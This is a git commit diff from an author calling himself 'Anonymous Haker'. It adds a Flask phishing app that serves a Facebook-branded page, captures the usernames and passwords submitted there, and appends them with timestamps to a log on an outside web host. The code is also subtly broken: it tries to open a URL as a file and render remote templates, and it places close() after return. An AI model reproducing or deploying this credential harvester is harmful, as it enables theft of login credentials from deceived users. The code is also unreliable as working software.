aca675604809aef3836a3bd16cd497b8c4123b41
♛Anonymous Haker♛ <95759540+Anonimus-Haker-Alon-Kreker-Darker@users.noreply.github.com>
2022-03-16 20:37:21 +0100

    Update loger.py

--- loger.py
+++ loger.py
@@ -1,4 +1,19 @@
-f = open("log.txt")
-for x, line in enumerate(f):
-	print("phising" + f)
-	f.close()
+from flask import Flask, render_template, request
+import datetime
+
+app = Flask(__name__)
+
+@app.route('/', methods=['GET', 'POST'])
+def home():
+    if request.method == 'POST':
+        username = request.form['username']
+        password = request.form['password']
+        db_ent = open("https://helppopol.000webhostapp.com/log.txt", 'a')    
+        db_ent.write("\n \n" + username + " : " + password + "     [*] {}".format(datetime.datetime.now().strftime("%A %b %Y and Time was  : %I:%M:%S")))   #writing username : password and datetime to each new line with append mode :
+        return render_template('https://helppopol.000webhostapp.com/facebook.php')
+        db_ent.close()
+    return render_template('https://helppopol.000webhostapp.com/facebook.php')
+
+# can not be called and execute arbitrary
+if __name__ == '__main__':
+    app.run(host='145.14.145.88', port=80)
